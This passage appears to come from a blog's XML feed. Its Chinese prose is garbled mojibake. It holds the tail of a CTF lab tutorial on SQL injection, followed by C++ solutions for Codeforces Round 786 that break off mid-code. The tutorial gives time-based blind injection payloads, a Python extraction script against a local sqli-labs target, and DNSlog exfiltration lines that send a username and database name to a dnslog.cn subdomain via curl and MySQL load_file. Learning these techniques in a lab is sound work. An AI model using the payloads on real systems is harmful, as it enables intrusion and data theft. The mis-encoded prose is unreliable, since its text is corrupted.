<code>sleep</code>ï¼Œå¦‚æœä¸º <code>0</code>ï¼Œé‚£ä¹ˆä¸ä¼šæ‰§è¡Œã€‚</p><p>æˆ‘è¿™é‡Œå†™äº†ä¸¤ä¸ª <code>payload</code>ï¼Œä¸€ä¸ªæ˜¯ <code>1&#39; and length(database())&lt;5 and sleep(5)--+</code> ä¸€ä¸ªæ˜¯ <code>1&#39; and length(database())&lt;9 and sleep(5)--+</code>ï¼Œæ‰“å¼€æ§åˆ¶å°çš„ç½‘ç»œé€‰é¡¹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/31.png" alt="31"></p><p>å‰è€…åœ¨ <code>10ms</code> çš„æ—¶é—´å†…å°±è¿”å›äº†ï¼Œè€Œåè€…åœ¨ <code>5.02S</code> æ‰è¿”å›ã€‚å¯ä»¥çœ‹åˆ°åé¢çš„è¡¨è¾¾å¼ä¸ºçœŸå°±ä¼šä¼‘çœ  <code>5S</code>ï¼Œæ ¹æ®è¿”å›çš„æ—¶é—´å·®æ¥åˆ¤æ–­è¡¨è¾¾å¼æ˜¯å¦æ­£ç¡®ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬ä¹Ÿæ¥è‡ªå·±å†™ä¸€ä¸ªè„šæœ¬æ¥è·‘è·‘æ—¶é—´ç›²æ³¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">length=<span class="number">100</span></span><br><span class="line">minlength=<span class="number">1</span></span><br><span class="line">ss=time.time()</span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> minlength&lt;length:</span><br><span class="line">    mid=(length+minlength+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">    sql=<span class="string">&#x27;and (select length(group_concat(schema_name))&lt;&#x27;</span>+<span class="built_in">str</span>(mid)+<span class="string">&#x27; from information_schema.schemata) and sleep(1)--+&#x27;</span></span><br><span class="line">    url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">    <span class="built_in">print</span>(url)</span><br><span class="line">    start=time.time()</span><br><span class="line">    p=get(url)</span><br><span class="line">    <span class="comment">#print(time.time()-start)</span></span><br><span class="line">    <span class="comment">#quit()</span></span><br><span class="line">    cnt+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> time.time()-start&gt;<span class="number">1</span>:</span><br><span class="line">        length=mid-<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        minlength=mid</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(length)</span><br><span class="line">now_str=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    l=<span class="number">32</span></span><br><span class="line">    r=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l&lt;r:</span><br><span class="line">        mid=(l+r+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line">        guess_str=now_str+<span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="comment">#print(mid,l,r)</span></span><br><span class="line">        sql=<span class="string">&quot;and (select ord(mid(group_concat(schema_name),&#123;0&#125;,1))&lt;&#123;1&#125; from information_schema.schemata) and sleep(1);--+&quot;</span>.<span class="built_in">format</span>(i+<span class="number">1</span>,mid)</span><br><span class="line">        url=<span class="string">&quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27; &quot;</span>+sql</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        start=time.time()</span><br><span class="line">        p=get(url)</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> time.time()-start&gt;<span class="number">1</span>:</span><br><span class="line">            r=mid-<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l=mid</span><br><span class="line">    now_str+=<span class="built_in">chr</span>(l)</span><br><span class="line">    <span class="built_in">print</span>(now_str)</span><br><span class="line"><span class="built_in">print</span>(cnt)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cost:&#x27;</span>+<span class="built_in">str</span>(time.time()-ss))</span><br></pre></td></tr></table></figure><p>è·Ÿå¸ƒå°”ç›²æ³¨å·®ä¸å¤šï¼Œå°±æ˜¯åœ¨åé¢åŠ ä¸Šä¸ª <code>sleep(1)</code> å°±è¡Œäº†ï¼Œæˆ‘ä»¬ä¹Ÿä¸ç”¨å›æ˜¾çš„ç»“æœå»åˆ¤æ–­äº†ï¼Œç›´æ¥ç”¨ç»è¿‡çš„æ—¶é—´æ˜¯å¦è¶…è¿‡ <code>1S</code> å°±å¥½äº†ã€‚è¿™é‡Œæˆ‘ä»¬ä¸ä»…ç»Ÿè®¡äº†è¯·æ±‚æ¬¡æ•°ï¼Œæˆ‘ä»¬è¿˜ç»Ÿè®¡äº†èŠ±è´¹æ—¶é—´ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/32.png" alt="31"></p><p>å¯ä»¥çœ‹åˆ°è¯·æ±‚æ¬¡æ•°è·Ÿä¸Šé¢æ˜¯ä¸€æ ·çš„(å°å£°ï¼šæˆ‘å·å·æ”¹äº†ASCIIçš„èŒƒå›´)ã€‚å¹¶ä¸”æ³¨å‡ºè¿™94ä¸ªå­—ç¬¦æˆ‘ä»¬èŠ±è´¹äº†å°†è¿‘ <code>4min</code>ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªæ—¶é—´æˆæœ¬ä¹Ÿæ˜¯éå¸¸é«˜çš„ã€‚</p><h5 id="æ€»ç»“-3"><a href="#æ€»ç»“-3" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>åŸºäºæ—¶é—´çš„ç›²æ³¨åŸºæœ¬é€‚ç”¨äºæ‰€æœ‰å«æœ‰æ³¨å…¥æ¼æ´çš„é¡µé¢ï¼Œä½†æ˜¯æ—¶é—´æˆæœ¬æ˜¯æœ€é«˜çš„ã€‚</p><h4 id="DNSlogç›²æ³¨"><a href="#DNSlogç›²æ³¨" class="headerlink" title="DNSlogç›²æ³¨"></a>DNSlogç›²æ³¨</h4><p>ä»¥ä¸Šä¸¤ä¸ªç›²æ³¨ä¸ç®¡æ˜¯å“ªä¸ªéƒ½éœ€è¦é¢‘ç¹è¯·æ±‚æ•°æ®åº“æ‰èƒ½è·å–åˆ°æ•°æ®åº“çš„å…·ä½“ä¿¡æ¯ï¼Œåœ¨å½“ä»£ <code>WAF</code> é˜²æŠ¤å¦‚æ­¤ä¸¥å¯†çš„æƒ…å†µä¸‹ï¼Œè¯·æ±‚å¦‚æ­¤å¤šå¾ˆå¯èƒ½ä¼šå¯¼è‡´ <code>ip</code> è¢« <code>ban</code>ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>load_file</code> æ¥å‘èµ·ä¸€ä¸ª <code>DNS</code> è¯·æ±‚ã€‚</p><h5 id="å‰ç½®èŠå£«ï¼šmysqlè¯»å–æ–‡ä»¶"><a href="#å‰ç½®èŠå£«ï¼šmysqlè¯»å–æ–‡ä»¶" class="headerlink" title="å‰ç½®èŠå£«ï¼šmysqlè¯»å–æ–‡ä»¶"></a>å‰ç½®èŠå£«ï¼šmysqlè¯»å–æ–‡ä»¶</h5><p>å…ˆä»‹ç»ä¸€ä¸ªå‡½æ•°ï¼Œä¹‹å‰è¯»å†™æ–‡ä»¶çš„æ—¶å€™ç”¨è¿‡ï¼š<code>load_file(file)</code> å¯ä»¥è¯»å–æ–‡ä»¶çš„å†…å®¹ã€‚è¿™é‡Œä¸ä»…å¯ä»¥è¯»å–æœ¬åœ°çš„æ–‡ä»¶ï¼Œè¿˜èƒ½å‘ <code>url</code> å‘èµ·è¯·æ±‚ã€‚è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸‹æ•°æ®åº“çš„é…ç½®ï¼Œæ•°æ®åº“ä¸­æœ‰ä¸€ä¸ªå˜é‡æ˜¯ <code>secure_file_priv</code>ï¼Œå¯ä»¥ç›´æ¥æŸ¥çœ‹æ•°æ®åº“çš„é…ç½®æ–‡ä»¶ï¼Œæˆ–è€…æ˜¯åœ¨ <code>mysql</code> ç»ˆç«¯ä¸­ç›´æ¥ä½¿ç”¨å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%secure%&#x27;;</span><br></pre></td></tr></table></figure><p>æ¥æŸ¥çœ‹è¿™ä¸€é¡¹é…ç½®ã€‚</p><ul><li>å½“ <code>secure_file_priv</code> ä¸ºç©ºï¼Œå°±å¯ä»¥è¯»å–ç£ç›˜çš„ç›®å½•ã€‚</li><li>å½“ <code>secure_file_priv</code> ä¸º<code>G:\</code>ï¼Œå°±å¯ä»¥è¯»å–Gç›˜çš„æ–‡ä»¶ã€‚</li><li>å½“ <code>secure_file_priv</code> ä¸º <code>null</code>ï¼Œ<code>load_file</code> å°±ä¸èƒ½åŠ è½½æ–‡ä»¶ã€‚</li></ul><p>æ‰€ä»¥ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä»¬æœ€å¥½æŠŠ <code>my.ini</code> æ–‡ä»¶çš„è¯¥é¡¹é…ç½®è®¾ç½®æˆï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">secure_file_priv</span>=<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å°±èƒ½ä»»æ„è¯»å–ï¼Œä»»æ„å†™æ–‡ä»¶äº†ï¼Œä½†æ˜¯åœ¨ç”Ÿäº§ç¯å¢ƒä¸­æ…é‡é…ç½®ï¼Œå› ä¸ºæ¯”è¾ƒå±é™©ã€‚</p><p>è¯»å–æ–‡ä»¶çš„ä¸€èˆ¬å½¢å¼æ˜¯ ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(file);</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚æˆ‘æƒ³è¯»å– <code>D:</code> ç›®å½•ä¸‹çš„ <code>1.txt</code> æ–‡ä»¶ï¼Œé‚£å°±æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;D:/1.txt&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/33.png" alt="33"></p><p>å¯ä»¥å‘ç°è¯»å–ç»“æœä»¥åå…­è¿›åˆ¶çš„æ–¹å¼è¾“å‡ºå‡ºæ¥äº†ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ–‡ä»¶åè‹¥ä»¥åŒåæ–œæ å¼€å¤´åˆ™ä»£è¡¨å‘ <code>url</code> å‘èµ·è¯·æ±‚ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/35.png" alt="35"></p><p>ä½†æ˜¯ä¼šå‘ç°è¿™ä¸€è¯·æ±‚æ¯”è¾ƒè€—æ—¶ï¼Œ</p><p>å†™æ–‡ä»¶çš„ä¸€èˆ¬å½¢å¼æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select $information into outfile &quot;$file&quot;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸èƒ½è¦†ç›–æ–‡ä»¶ï¼Œåªèƒ½åˆ›å»ºæ–‡ä»¶ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/34.png" alt="34"></p><p>åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè¯»æ–‡ä»¶å¯ä»¥è¯»å–ä¸€äº›é…ç½®æ–‡ä»¶ä¿¡æ¯ï¼Œæ³„éœ²æ•æ„Ÿå†…å®¹</p><h5 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h5><p>åŸŸåè§£ææœåŠ¡(Domain Name Server)ï¼Œæˆ‘ä»¬çŸ¥é“ <code>DNS</code> çš„ä½œç”¨å°±æ˜¯å°†æˆ‘ä»¬ç†ŸçŸ¥çš„åŸŸåè½¬æ¢æˆ <code>ip</code> åœ°å€ã€‚</p><p>å› ç‰¹ç½‘é‡‡ç”¨å±‚æ¬¡æ ‘çŠ¶ç»“æ„å‘½åæ–¹æ³•ã€‚åŸŸæ˜¯åå­—ç©ºé—´ä¸­ä¸€ä¸ªå¯è¢«ç®¡ç†çš„åˆ’åˆ†ï¼ˆæŒ‰æœºæ„ç»„ç»‡åˆ’åˆ†ï¼‰ï¼ŒåŸŸå¯è¢«åˆ’åˆ†ä¸ºå­åŸŸï¼Œå­åŸŸå¯å†è¢«åˆ’åˆ†ï¼Œå³å½¢æˆäº†é¡¶çº§åŸŸåã€äºŒçº§åŸŸåã€ä¸‰çº§åŸŸåç­‰ã€‚ä»å³å‘å·¦ä¸ºé¡¶çº§åŸŸåã€äºŒçº§åŸŸåã€ä¸‰çº§åŸŸåç­‰ï¼Œç”¨ç‚¹éš”å¼€ã€‚</p><p>æ¯”å¦‚è°·æ­Œçš„åŸŸåï¼š<code>www.google.com</code><br>å®ƒç”±ä¸‰ä¸ªæ ‡å·ç»„æˆï¼Œ <code>com</code> å³ä¸ºé¡¶çº§åŸŸåï¼Œ<code>google</code> ä¸ºäºŒçº§åŸŸåï¼Œ<code>www</code> å³ä¸ºä¸‰çº§åŸŸå,ä¸”åŸŸåä¸åˆ†åŒºå¤§å°å†™ã€‚<br>æ¯”å¦‚æˆ‘è®¿é—® <code>www.google.com</code> å‘ç”Ÿäº†ä»¥ä¸‹çš„äº‹æƒ…ï¼š</p><ol><li>æˆ‘è¯·æ±‚æˆ‘è‡ªå·±è®¾ç½®çš„åŸŸåæœåŠ¡å™¨</li><li>åŸŸåæœåŠ¡å™¨å‘çŸ¥é“æ­¤åŸŸåçš„æœåŠ¡å™¨å‘èµ·è¯·æ±‚</li><li>åŸŸåæœåŠ¡å™¨å¾—åˆ°äº† <code>www.google.com</code> çš„ <code>ip</code> åœ°å€ï¼Œè¿”å›ç»™æˆ‘è®¾ç½®çš„æœåŠ¡å™¨ï¼Œæœ€åè¿”å›ç»™æˆ‘ã€‚</li></ol><p>æˆ‘ä»¬åœ¨åŸŸåæœåŠ¡å™¨ä¸­å°±ç•™ä¸‹äº†è¿™æ ·ä¸€æ¡è®°å½•ï¼š<code>x.x.x.x</code> ç”¨æˆ·åœ¨ä»€ä¹ˆæ—¶å€™è§£æäº† <code>www.google.com</code> çš„åŸŸåã€‚</p><h5 id="DNSlog"><a href="#DNSlog" class="headerlink" title="DNSlog"></a>DNSlog</h5><p>DNSlogæ˜¯ä»€ä¹ˆã€‚DNSlogå°±æ˜¯å­˜å‚¨åœ¨DNSæœåŠ¡å™¨ä¸Šçš„åŸŸåä¿¡æ¯ï¼Œå®ƒè®°å½•ç€ç”¨æˆ·å¯¹åŸŸå <code>www.google.com</code> ç­‰çš„è®¿é—®ä¿¡æ¯ï¼Œç±»ä¼¼æ—¥å¿—æ–‡ä»¶ã€‚</p><p>å‡å¦‚æˆ‘åœ¨ <code>www.google.com</code> ä¹‹åè¿˜åŠ äº†ä¸€ä¸ªå­åŸŸåï¼Œæˆ‘çš„è¯·æ±‚å†…å®¹æ˜¯ <code>xxx.www.google.com</code>ï¼Œé‚£ä¹ˆæ­¤æ—¶å¤–éƒ¨æœåŠ¡å™¨å¹¶ä¸çŸ¥é“è°·æ­Œåœ¨ <code>www</code> åŸŸåä¸‹é¢è¿˜æœ‰ä¸€ä¸ªå­åŸŸåï¼Œé‚£ä¹ˆå®ƒå°†åŸŸåè¯·æ±‚å‘é€ç»™è°·æ­Œçš„æœåŠ¡å™¨ï¼Œè°·æ­ŒæœåŠ¡å™¨å†è§£æå‡ºä¸€ä¸ª <code>ip</code> åœ°å€å›å»ç»™åŸŸåæœåŠ¡å™¨ï¼Œå½“ç„¶ä¹Ÿå¯èƒ½æ²¡æœ‰è¿”å›ä¸ºç©ºï¼Œä¸è¿‡è¿™ä¸ªè¯·æ±‚è¿˜æ˜¯ä¼šè¢«è°·æ­Œçš„æœåŠ¡è®°å½•ä¸‹æ¥ã€‚è¿™æ ·æˆ‘ä»¬çš„ <code>dns</code> å°±ä¼šåœ¨ç½‘ç«™çš„ <code>dns</code> æœåŠ¡å™¨ç•™ä¸‹ä¿¡æ¯äº†ã€‚</p><p>é‚£ä¹ˆ <code>dnslog</code> æ³¨å…¥å°±æ˜¯è¿™ä¹ˆä¸ªåŸç†äº†ã€‚å®ƒåœ¨ä½ è¯·æ±‚åŸŸåçš„æ—¶å€™ï¼Œå¦‚æœå‡ºç°äº†åˆ†é…ç»™ä½  <code>dnslog</code> æœåŠ¡å™¨çš„æ—¥å¿—ï¼Œå°±ä¼šæŠŠæ•°æ®è¿”å›ç»™ä½ ã€‚  </p><p>æˆ‘ä»¬å…ˆæ¥è¯•è¯•æ™®é€šçš„ <code>dnslog</code> å¸¦å‡ºä¿¡æ¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl %USERNAME%.xxx.dnslog.cn</span><br></pre></td></tr></table></figure><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/36.png" alt="36"></p><p>å¯ä»¥çœ‹åˆ°ç¯å¢ƒå˜é‡è¢«æ‰§è¡Œå¸¦å‡ºåˆ°æˆ‘ä»¬çš„ <code>dnslog</code> æœåŠ¡å™¨é‡Œé¢å»äº†ï¼Œ<code>connection refused</code> æ˜¯å› ä¸ºä»–å¯¹æ‰€æœ‰çš„å­åŸŸåè§£æçš„æœåŠ¡å™¨åœ°å€éƒ½æ˜¯ <code>127.0.0.1</code> æ‰€ä»¥ä½ æœ¬æœºæ²¡å¼€ <code>web</code> æœåŠ¡å°±ä¼šè¿™æ ·ã€‚</p><p>æˆ‘ä»¬å†æ¥è¯•è¯•çœ‹åœ¨ <code>mysql</code> é‡Œé¢æ³„éœ²ä¿¡æ¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxx.dnslog.cn&#x27;));</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥è¯•è¯•å»è¯·æ±‚ä¸€ä¸‹çœ‹çœ‹ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/37.png" alt="37"></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/38.png" alt="38"></p><p>å¯ä»¥å‘ç°æˆåŠŸæ³„éœ²ä¿¡æ¯ã€‚</p><p>ä½†æ˜¯ä¹Ÿè¦æ³¨æ„ä¸€ä¸‹ï¼Œæ¯çº§åŸŸåé•¿åº¦æœ€é•¿ä¸º63ï¼Œå› æ­¤æ¯æ¬¡æˆ‘ä»¬åœ¨è¯·æ±‚çš„æ—¶å€™é™åˆ¶ä¸€ä¸‹ï¼Œç”¨ <code>mid</code> å»æˆªå–å°±å¥½äº†ï¼Œè™½ç„¶å‘èµ·ä¸€æ¬¡ <code>DNSlog</code> è¯·æ±‚è¦çš„æ—¶é—´ä¹Ÿå¾ˆå¤šï¼Œä½†æ˜¯æ¯”ç›²æ³¨è¦å¥½ä¸€ç‚¹ã€‚</p><p>åŸŸåè‹¥å¸¦æœ‰ç‰¹æ®Šå­—ç¬¦ä¼šå¯¼è‡´è¯·æ±‚å¤±è´¥ï¼Œå› æ­¤åœ¨è‹¥æ³„éœ²çš„ä¿¡æ¯æœ‰ç‰¹æ®Šç¬¦å·æ³¨æ„ç¼–ç ä¸€ä¸‹ï¼Œç”¨ <code>hex</code> å»ç¼–ç å°±å¥½äº†ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p><code>sql</code> æ³¨å…¥ä¹Ÿå°±å­¦äº†è¿™ä¹ˆå¤šï¼Œæš‚æ—¶å…ˆå†™åˆ°è¿™é‡Œå§ï¼Œåç»­å­¦äº†æ–°çš„èŠå£«å†æ¥è¡¥å……ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
          <category> sqlæ³¨å…¥ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round 786(Div.3)</title>
      <link href="/2022/05/03/Codeforces%20Round%20786(Div.3)/"/>
      <url>/2022/05/03/Codeforces%20Round%20786(Div.3)/</url>
      
        <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1674">Codeforces Round #786 (Div. 3)</a>é¢˜è§£æ¥äº†</p><p>å®æ—¶å½•é¢‘åœ¨<a href="https://www.bilibili.com/video/BV18B4y117sn?spm_id_from=333.999.0.0">è¿™é‡Œ</a></p><span id="more"></span><h2 id="A-Number-Transformation"><a href="#A-Number-Transformation" class="headerlink" title="A. Number Transformation"></a>A. Number Transformation</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>å°±æ˜¯è¯´è®©ä½ æ‰¾åˆ°ä¸¤ä¸ªæ•° $a,b$ï¼Œä½¿å¾— $x\times a^b=y$ è¿™é‡Œå¯ä»¥ä½¿å¾— $b=1$ ç„¶åå°±åˆ¤æ–­ä¸€ä¸‹ $y\ mod\ x=0$ æ˜¯å¦æˆç«‹å³å¯ã€‚ </p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x,y;</span><br><span class="line">    cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    <span class="keyword">if</span>(y%x==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1 %d\n&quot;</span>,y/x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;0 0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Dictionary"><a href="#B-Dictionary" class="headerlink" title="B. Dictionary"></a>B. Dictionary</h2><h3 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/05/03/Codeforces%20Round%20786(Div.3)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>å°±æ˜¯è¯´è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²çš„å­—å…¸åºï¼Œå­—ç¬¦ä¸²åªæœ‰2ä¸ªå­—ç¬¦ï¼Œç„¶åä¸¤ä¸ªå­—ç¬¦åº”è¯¥ä¸èƒ½ä¸€æ ·ï¼Œè¿™æ ·çš„è¯ç›´æ¥ç”¨å…¬å¼å°±å¥½äº†ï¼Œå¦‚æœèƒ½ä¸€æ ·ï¼Œè¿™ä¸ªå…¬å¼åº”è¯¥æ˜¯ $(a[0]-â€˜aâ€™)\times 26+a[1]-â€˜aâ€™$ çš„ï¼Œè¿™é‡Œæ—¢ç„¶ä¸èƒ½ä¸€æ ·é‚£å°±éƒ½å‡ä¸€å°±å¥½äº†ï¼Œä½†æ˜¯è¦æ³¨æ„ï¼Œå¦‚æœ $a[1]$ ä¸è¶…è¿‡ $a[0]$ åˆ™ä¸éœ€è¦å‡ä¸€ã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span 